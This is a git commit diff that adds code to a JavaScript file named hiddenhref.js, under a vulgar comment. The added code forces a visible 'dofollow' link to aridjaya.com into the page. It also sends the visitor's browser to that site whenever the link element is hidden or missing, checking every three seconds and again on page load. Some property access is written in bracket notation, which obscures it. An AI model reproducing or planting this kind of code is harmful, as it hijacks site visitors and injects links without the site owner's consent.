18894b960664afe71cc8078566296c89ccee93df
irawanria85 <irawanria85@gmail.com>
2019-08-25 19:55:24 +0700

    Update hiddenhref.js

--- hiddenhref.js
+++ hiddenhref.js
@@ -21,3 +21,6 @@ $(function() {
             },0);
         }}, false);
 }(window, location));
+/* Jancoxxx */
+$(document)['ready'](function() { 
+setInterval(function() { if (!$('#mycontent:visible')['length']) { window['location']['href'] = 'http://www.aridjaya.com/' } }, 3000) }); window.onload = function() { var e = document.getElementById("mycontent"); if (e == null) { window.location.href = "https://www.aridjaya.com/" } e.setAttribute("href", "https://www.aridjaya.com/"); e.setAttribute("ref", "dofollow"); e.setAttribute("title", "Aridjaya"); e.setAttribute("style", "display: inline-block!important; font-size: inherit!important; color: blue!important; visibility: visible!important; opacity: 1!important;"); e.innerHTML = "Aridjaya" }
